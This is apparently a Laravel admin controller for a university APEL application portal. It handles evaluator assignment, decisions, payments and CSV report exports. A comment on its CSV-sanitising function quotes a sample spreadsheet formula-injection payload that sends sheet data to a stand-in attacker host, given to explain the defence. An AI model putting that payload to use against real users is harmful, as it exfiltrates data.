<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Application;
use App\Models\User;
use App\Models\AssessmentSubmission;
use App\Models\ActivityLog;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Log;
use App\Mail\GenericQueueMail;
use App\Services\ApelDecisionSupportService;

class ApplicationManagementController extends Controller
{
    public function __construct(private ApelDecisionSupportService $decisionSupport)
    {
    }

    public function index()
    {
        $all = Application::where('status', '!=', 'Draft')->get();
        
        $apelA = $all->where('application_type', 'APEL A')
            ->sortByDesc(function ($app) {
                return $app->target_year ?? date('Y', strtotime($app->submission_date));
            });
            
        $apelC = $all->where('application_type', 'APEL C')
            ->sortByDesc(function ($app) {
                return $app->target_year ?? date('Y', strtotime($app->submission_date));
            });
            
        $applications = $apelA->merge($apelC);

        return view('admin.applications.index', compact('applications'));
    }

    public function assignForm($id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        if ($application->application_type === 'APEL C') {
            if (empty($application->credit_course_code) || empty($application->credit_course_name)) {
                if (preg_match('/^(.*?)\s*\(([^)]+)\)$/', $application->program_applied, $matches)) {
                    $application->credit_course_name = trim($matches[1]);
                    $application->credit_course_code = trim($matches[2]);
                    $application->save();
                }
            }
        }

        $evaluators = User::where('role', 'evaluator')->get();
        $apelAEligibility = $this->decisionSupport->evaluateApelA($application);
        $evaluatorBrief = $this->decisionSupport->generateEvaluatorBrief($application);
        $evaluatorRecommendations = $this->decisionSupport->rankEvaluators();

        return view('admin.applications.assign', compact(
            'application',
            'evaluators',
            'apelAEligibility',
            'evaluatorBrief',
            'evaluatorRecommendations'
        ));
    }

    public function evaluatorBrief($id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        if ($application->application_type !== 'APEL A') {
            return redirect()->route('admin.applications.assign.form', $application->_id)
                ->withErrors([
                    'brief' => 'The evaluator brief is currently available for APEL A applications only.',
                ]);
        }

        $student = User::where('_id', (string) $application->user_id)->first();
        $brief = $this->decisionSupport->generateEvaluatorBrief($application);

        return view('admin.applications.brief', compact('application', 'student', 'brief'));
    }

    public function assignEvaluator(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();
        $isApelC = $application->application_type === 'APEL C';

        $rules = [
            'evaluator_id' => 'required|string',
            'evaluator_2_id' => 'nullable|string|different:evaluator_id',
        ];

        if ($isApelC) {
            $rules['assessment_type'] = 'required|in:portfolio,test';
        }

        $request->validate($rules);

        if (($application->payment_status ?? 'pending') !== 'verified') {
            return redirect()->back()->withErrors([
                'payment_status' => 'Payment must be verified before assigning an evaluator.',
            ]);
        }

        $evaluator = User::where('_id', $request->evaluator_id)
            ->where('role', 'evaluator')
            ->first();

        if (!$evaluator) {
            return back()->withErrors([
                'evaluator_id' => 'Selected evaluator is invalid.',
            ]);
        }

        $evaluator2 = null;
        if ($request->filled('evaluator_2_id')) {
            $evaluator2 = User::where('_id', $request->evaluator_2_id)
                ->where('role', 'evaluator')
                ->first();

            if (!$evaluator2) {
                return back()->withErrors([
                    'evaluator_2_id' => 'Selected second evaluator is invalid.',
                ]);
            }
        }

        $updateData = [
            'evaluator_id' => (string) $evaluator->_id,
            'evaluator_2_id' => $evaluator2 ? (string) $evaluator2->_id : null,
            'assigned_at' => now(),
            'status' => 'Evaluator Assigned',
            'status_updated_at' => now(),
        ];

        if ($isApelC) {
            $updateData['assessment_type'] = $request->assessment_type;
            $updateData['credit_status'] = 'assigned_for_assessment';
        } else {
            $updateData['review_stage'] = 'assigned_for_review';
        }

        $application->update($updateData);

        if ($isApelC) {
            if ($request->assessment_type === 'portfolio') {
                \App\Models\AssessmentSubmission::updateOrCreate(
                    ['application_id' => (string) $application->_id],
                    [
                        'student_id' => (string) $application->user_id,
                        'status' => 'submitted',
                        'submitted_at' => now(),
                        'answer_file' => null,
                    ]
                );
            } elseif ($request->assessment_type === 'test') {
                \App\Models\AssessmentSubmission::where('application_id', (string) $application->_id)
                    ->whereNull('answer_file')
                    ->delete();
            }
        }

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        $evalNames = $evaluator2 ? "{$evaluator->name} & {$evaluator2->name}" : $evaluator->name;

        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Assigned Evaluator',
            'description' => "Assigned evaluator(s) {$evalNames} to {$application->application_type} application for '{$application->program_applied}' (Student: {$studentName})",
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL Evaluator Assigned',
            "An evaluator has been assigned to your application.\n\n" .
                "Application: {$application->application_type}\n" .
                "Programme / Course: {$application->program_applied}\n" .
                "Evaluator(s): {$evalNames}\n" .
                "Status: Evaluator Assigned"
        );

        $this->sendMail(
            $evaluator->_id,
            'New UTM APEL Application Assigned',
            "You have been assigned to review an APEL application.\n\n" .
                "Application: {$application->application_type}\n" .
                "Programme / Course: {$application->program_applied}\n" .
                "Status: Evaluator Assigned"
        );

        if ($evaluator2) {
            $this->sendMail(
                $evaluator2->_id,
                'New UTM APEL Application Assigned',
                "You have been assigned to review an APEL application.\n\n" .
                    "Application: {$application->application_type}\n" .
                    "Programme / Course: {$application->program_applied}\n" .
                    "Status: Evaluator Assigned"
            );
        }

        return redirect()->route('admin.applications.index')
            ->with('success', 'Evaluator assigned successfully.');
    }

    public function advisorApprove(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        $request->validate([
            'advisor_name' => 'required|string|max:255',
            'advisor_evaluation' => 'required|array',
            'recommendation_status' => 'required|in:Recommended,NOT recommended',
            'mode_of_assessment' => 'required|in:portfolio,test',
            'advisor_remarks' => 'nullable|string|max:1000',
        ]);

        $recommended = $request->recommendation_status === 'Recommended';
        
        $status = $recommended ? 'Advisor Approved' : 'Advisor Rejected';
        
        $application->update([
            'status' => $status,
            'status_updated_at' => now(),
            'advisor_name' => $request->advisor_name,
            'advisor_approved_at' => now(),
            'mode_of_assessment' => $request->mode_of_assessment,
            'advisor_evaluation' => [
                'clo_scores' => $request->advisor_evaluation,
                'recommendation' => $request->recommendation_status,
                'remarks' => $request->advisor_remarks,
            ],
            'payment_status' => $recommended ? 'pending' : 'cancelled',
        ]);

        $studentName = $application->pre_app_data['personal_particulars']['name'] ?? 'Student';
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Advisor Evaluated',
            'description' => "Advisor '{$request->advisor_name}' reviewed pre-application for student '{$studentName}' and marked as '{$request->recommendation_status}' (Assessment Mode: " . ucfirst($request->mode_of_assessment) . ")",
            'ip_address' => $request->ip(),
        ]);

        $this->sendMail(
            $application->user_id,
            "UTM APEL C Pre-Application Decision",
            "Your pre-application has been reviewed by Advisor '{$request->advisor_name}'.\n\n" .
                "Decision: {$request->recommendation_status}\n" .
                "Recommended Assessment Mode: " . ucfirst($request->mode_of_assessment) . "\n" .
                "Status: {$status}\n\n" .
                "Thank you.\nFaculty of Computing, UTM"
        );

        return redirect()->route('admin.applications.index')
            ->with('success', 'Advisor review submitted successfully.');
    }

    public function updateStatus(Request $request, $id)
    {
        $request->validate([
            'status' => 'required|string',
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $updateData = [
            'status' => $request->status,
            'status_updated_at' => now(),
        ];

        if ($request->status === 'Assessment In Progress') {
            $updateData['appeal_status'] = 'under_review';
            
            // Clear previous decisions to allow re-evaluation
            if ($application->application_type === 'APEL A') {
                $updateData['final_decision'] = 'pending';
                $updateData['final_decision_remarks'] = null;
                $updateData['review_stage'] = 'assigned_for_review';
                $updateData['evaluator_1_decision'] = null;
                $updateData['evaluator_1_feedback'] = null;
                $updateData['evaluator_1_reviewed_at'] = null;
                $updateData['evaluator_2_decision'] = null;
                $updateData['evaluator_2_feedback'] = null;
                $updateData['evaluator_2_reviewed_at'] = null;
                $updateData['reviewed_at'] = null;
            } else {
                $updateData['credit_decision'] = 'pending';
                $updateData['credit_remarks'] = null;
                $updateData['credit_hours_approved'] = null;
                $updateData['credit_status'] = 'assigned_for_assessment';
                $updateData['reviewed_at'] = null;

                // Clear previous evaluator assessment grade
                AssessmentSubmission::where('application_id', (string) $application->_id)->update([
                    'evaluator_1_score' => null,
                    'evaluator_1_result' => null,
                    'evaluator_1_feedback' => null,
                    'evaluator_1_graded_at' => null,
                    'evaluator_2_score' => null,
                    'evaluator_2_result' => null,
                    'evaluator_2_feedback' => null,
                    'evaluator_2_graded_at' => null,
                    'score' => null,
                    'result' => null,
                    'grade' => null,
                    'grader_feedback' => null,
                    'graded_by' => null,
                    'graded_at' => null,
                    'status' => 'submitted', // Reset status to submitted so it can be re-graded
                ]);
            }
        } else {
            $updateData['appeal_status'] = $application->appeal_status;
        }

        $application->update($updateData);

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        $logAction = ($request->status === 'Assessment In Progress') ? 'Reopened Assessment' : 'Updated Status';
        $logDesc = ($request->status === 'Assessment In Progress')
            ? "Reopened assessment for {$application->application_type} application for '{$application->program_applied}' (Student: {$studentName})"
            : "Updated status of {$application->application_type} application for '{$application->program_applied}' to '{$request->status}' (Student: {$studentName})";
            
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => $logAction,
            'description' => $logDesc,
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL Application Status Update',
            "Your application status has been updated.\n\n" .
                "Application: {$application->application_type}\n" .
                "Programme / Course: {$application->program_applied}\n" .
                "Current Status: {$application->status}"
        );

        return redirect()->back()
            ->with('success', 'Application status updated successfully.');
    }

    public function finalizeApelA(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        if ($application->application_type !== 'APEL A') {
            return redirect()->route('admin.applications.index')
                ->with('success', 'This action is only available for APEL A applications.');
        }

        if (in_array($application->final_decision ?? '', ['approved', 'rejected'])) {
            return redirect()->back()->withErrors([
                'final_decision' => 'The final decision has already been saved and cannot be updated.',
            ]);
        }

        $isSingleEvaluator = empty($application->evaluator_2_id);
        $bothReviewed = !empty($application->evaluator_1_reviewed_at) && !empty($application->evaluator_2_reviewed_at);
        $canFinalize = $isSingleEvaluator ? !empty($application->evaluator_1_reviewed_at) : $bothReviewed;

        if (!$canFinalize) {
            return redirect()->back()->withErrors([
                'final_decision' => $isSingleEvaluator
                    ? 'Final decision cannot be made before the evaluator has submitted their review.'
                    : 'Final decision cannot be made before both evaluators have submitted their reviews.',
            ]);
        }

        $request->validate([
            'final_decision' => 'required|in:pending,approved,rejected',
            'final_decision_remarks' => 'nullable|string|max:1000',
        ]);

        $finalDecision = $request->final_decision;

        $application->update([
            'final_decision' => $finalDecision,
            'final_decision_remarks' => $request->final_decision_remarks,
            'finalized_at' => now(),
            'review_stage' => $finalDecision === 'pending'
                ? 'awaiting_final_decision'
                : 'final_decision_completed',
            'status' => match ($finalDecision) {
                'approved' => 'Final Approved',
                'rejected' => 'Final Rejected',
                default => 'Awaiting Final Decision',
            },
            'status_updated_at' => now(),
        ]);

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Finalized APEL A',
            'description' => "Completed final decision as '" . ucfirst($finalDecision) . "' for APEL A application '{$application->program_applied}' (Student: {$studentName})",
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL A Final Decision',
            "Your APEL A final decision has been updated.\n\n" .
                "Programme: {$application->program_applied}\n" .
                "Final Decision: " . ucfirst($application->final_decision ?? 'pending') . "\n" .
                "Status: {$application->status}\n\n" .
                "Remarks: " . ($application->final_decision_remarks ?? 'No remarks provided.')
        );

        return redirect()->route('admin.applications.assign.form', $application->_id)
            ->with('success', 'Final APEL A decision updated successfully.');
    }

    public function apelAIndex()
    {
        $applications = Application::where('application_type', 'APEL A')
            ->orderBy('submission_date', 'desc')
            ->get();

        return view('admin.apel_a.index', compact('applications'));
    }

    public function finalizeApelC(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        if ($application->application_type !== 'APEL C') {
            return redirect()->route('admin.applications.index')
                ->withErrors([
                    'credit_decision' => 'This action is only available for APEL C applications.',
                ]);
        }

        if (in_array($application->credit_decision ?? '', ['approved', 'rejected'])) {
            return redirect()->back()->withErrors([
                'credit_decision' => 'The final credit decision has already been saved and cannot be updated.',
            ]);
        }

        $gradedSubmission = AssessmentSubmission::where('application_id', (string) $application->_id)
            ->whereNotNull('graded_at')
            ->first();

        if (!$gradedSubmission) {
            return redirect()->back()->withErrors([
                'credit_decision' => 'Final credit decision cannot be made before grading is completed.',
            ])->withInput();
        }

        $request->validate([
            'credit_decision' => 'required|in:pending,approved,rejected',
            'credit_remarks' => 'nullable|string|max:1000',
            'credit_course_code' => 'nullable|string|max:100',
            'credit_course_name' => 'nullable|string|max:255',
        ]);

        $decision = $request->credit_decision;

        $submission = \App\Models\AssessmentSubmission::where('application_id', (string) $application->_id)->first();
        if ($submission && $submission->result === 'fail' && $decision === 'approved') {
            return redirect()->back()->with('error', 'Cannot approve credit decision when the grading outcome is fail/rejected.');
        }

        $approvedHours = 0;
        if ($decision === 'approved') {
            $approvedHours = self::getCreditHoursFromCourseCode($application->credit_course_code);
        }

        $application->update([
            'credit_decision' => $decision,
            'credit_remarks' => $request->credit_remarks,
            'credit_hours_approved' => $approvedHours,
            'credit_course_code' => $request->credit_course_code,
            'credit_course_name' => $request->credit_course_name,
            'credit_decided_at' => now(),
            'reviewed_at' => $application->reviewed_at ?? now(),
            'credit_status' => $decision === 'pending'
                ? 'awaiting_credit_decision'
                : 'credit_decision_completed',
            'review_stage' => $decision === 'pending'
                ? 'awaiting_credit_decision'
                : 'completed',
            'status' => match ($decision) {
                'approved' => 'Final Approved',
                'rejected' => 'Final Rejected',
                default => 'Awaiting Final Decision',
            },
            'status_updated_at' => now(),
        ]);

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Finalized APEL C',
            'description' => "Completed credit transfer decision as '" . ucfirst($decision) . "' with " . ($request->credit_hours_approved ?? '0') . " approved hours for course '{$application->program_applied}' (Student: {$studentName})",
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL C Final Credit Decision',
            "Your APEL C final credit decision has been updated.\n\n" .
                "Course: {$application->program_applied}\n" .
                "Credit Decision: " . ucfirst($application->credit_decision ?? 'pending') . "\n" .
                "Approved Credit Hours: " . ($application->credit_hours_approved ?? 'Not decided') . "\n" .
                "Status: {$application->status}\n\n" .
                "Remarks: " . ($application->credit_remarks ?? 'No remarks provided.')
        );

        return redirect()->route('admin.applications.assign.form', $application->_id)
            ->with('success', 'Final APEL C credit decision updated successfully.');
    }

    public function updatePayment(Request $request, $id)
    {
        $request->validate([
            'payment_status' => 'required|in:pending,submitted,verified,rejected',
            'payment_reference' => 'nullable|string|max:255',
            'payment_remarks' => 'nullable|string|max:1000',
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        if (($application->payment_status ?? '') === 'verified') {
            return redirect()->back()->withErrors([
                'payment_status' => 'Payment has already been verified and cannot be updated.',
            ]);
        }

        $paymentStatus = $request->payment_status;

        $application->update([
            'payment_status' => $paymentStatus,
            'payment_reference' => $request->payment_reference,
            'payment_remarks' => $request->payment_remarks,
            'payment_verified_at' => $paymentStatus === 'verified' ? now() : null,
            'status' => match ($paymentStatus) {
                'submitted' => 'Payment Submitted',
                'verified' => 'Payment Verified',
                'rejected' => 'Payment Rejected',
                default => 'Payment Pending',
            },
            'status_updated_at' => now(),
        ]);

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Verified Payment',
            'description' => "Updated payment verification status to '" . ucfirst($paymentStatus) . "' for {$application->application_type} application '{$application->program_applied}' (Student: {$studentName})",
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL Payment Status Update',
            "Your payment status has been updated.\n\n" .
                "Application: {$application->application_type}\n" .
                "Programme / Course: {$application->program_applied}\n" .
                "Payment Status: " . ucfirst($application->payment_status ?? 'pending') . "\n" .
                "Current Status: {$application->status}\n\n" .
                "Remarks: " . ($application->payment_remarks ?? 'No remarks provided.')
        );

        return redirect()->back()
            ->with('success', 'Payment status updated successfully.');
    }

    public function printApelAReport()
    {
        $applications = Application::where('application_type', 'APEL A')
            ->orderBy('submission_date', 'desc')
            ->get();

        $total = $applications->count();
        $approved = $applications->where('status', 'Final Approved')->count();
        $rejected = $applications->where('status', 'Final Rejected')->count();
        $pending = $total - $approved - $rejected;

        return view('admin.reports.apel_a', compact('applications', 'total', 'approved', 'rejected', 'pending'));
    }

    public function printApelCReport()
    {
        $applications = Application::where('application_type', 'APEL C')
            ->orderBy('submission_date', 'desc')
            ->get();

        $total = $applications->count();
        $approved = $applications->where('status', 'Final Approved')->count();
        $rejected = $applications->where('status', 'Final Rejected')->count();
        $pending = $total - $approved - $rejected;

        return view('admin.reports.apel_c', compact('applications', 'total', 'approved', 'rejected', 'pending'));
    }

    /**
     * Neutralise spreadsheet formula injection in exported CSV cells.
     *
     * fputcsv escapes CSV delimiters but not formulas. Student name is
     * user-supplied at registration and program_applied derives from student
     * input, so a value beginning with = + - @ (or a leading tab/CR, which Excel
     * strips before parsing) is evaluated when an administrator opens the
     * downloaded report. That turns a student-controlled string into code
     * execution in the admin's spreadsheet - for example
     * =HYPERLINK("https://evil.tld/?d="&A1,"Click") exfiltrating the sheet.
     *
     * Prefixing with a single quote makes the cell a literal string in Excel,
     * LibreOffice and Google Sheets.
     */
    private static function csvSafe($value): string
    {
        $value = (string) $value;

        if ($value !== '' && str_contains("=+-@	", $value[0])) {
            return "'" . $value;
        }

        return $value;
    }

    public static function getCreditHoursFromCourseCode($code)
    {
        $code = trim($code);
        if (empty($code)) {
            return config('apel.default_credit_hours', 3);
        }
        $lastChar = substr($code, -1);
        if (is_numeric($lastChar)) {
            return (int) $lastChar;
        }
        return config('apel.default_credit_hours', 3);
    }

    private function sendMail($userId, $subject, $body)
    {
        $user = User::where('_id', (string) $userId)->first();

        if (!$user || !$user->email) {
            return;
        }

        try {
            Mail::to($user->email)->queue(new GenericQueueMail($subject, $body));
        } catch (\Exception $e) {
            Log::error('Admin mail error: ' . $e->getMessage());
        }
    }

    public function exportApelAReport()
    {
        $applications = Application::where('application_type', 'APEL A')
            ->orderBy('submission_date', 'desc')
            ->get();

        $headers = [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => 'attachment; filename="apel_a_report_' . date('Y-m-d') . '.csv"',
        ];

        $callback = function () use ($applications) {
            $file = fopen('php://output', 'w');
            fputcsv($file, ['Submission Date', 'Student Name', 'Programme Applied', 'Admission Decision', 'Status']);

            foreach ($applications as $app) {
                $studentName = User::where('_id', $app->user_id)->value('name') ?? 'N/A';
                fputcsv($file, [
                    self::csvSafe($app->submission_date),
                    self::csvSafe($studentName),
                    self::csvSafe($app->program_applied),
                    self::csvSafe(ucfirst($app->admission_decision ?? 'pending')),
                    self::csvSafe($app->status),
                ]);
            }

            fclose($file);
        };

        return response()->stream($callback, 200, $headers);
    }

    public function exportApelCReport()
    {
        $applications = Application::where('application_type', 'APEL C')
            ->orderBy('submission_date', 'desc')
            ->get();

        $headers = [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => 'attachment; filename="apel_c_report_' . date('Y-m-d') . '.csv"',
        ];

        $callback = function () use ($applications) {
            $file = fopen('php://output', 'w');
            fputcsv($file, ['Submission Date', 'Student Name', 'Course Name', 'Course Code', 'Approved Hours', 'Credit Decision', 'Status']);

            foreach ($applications as $app) {
                $studentName = User::where('_id', $app->user_id)->value('name') ?? 'N/A';
                fputcsv($file, [
                    self::csvSafe($app->submission_date),
                    self::csvSafe($studentName),
                    self::csvSafe($app->credit_course_name ?? 'N/A'),
                    self::csvSafe($app->credit_course_code ?? 'N/A'),
                    self::csvSafe($app->credit_hours_approved ?? 0),
                    self::csvSafe(ucfirst($app->credit_decision ?? 'pending')),
                    self::csvSafe($app->status),
                ]);
            }

            fclose($file);
        };

        return response()->stream($callback, 200, $headers);
    }
}
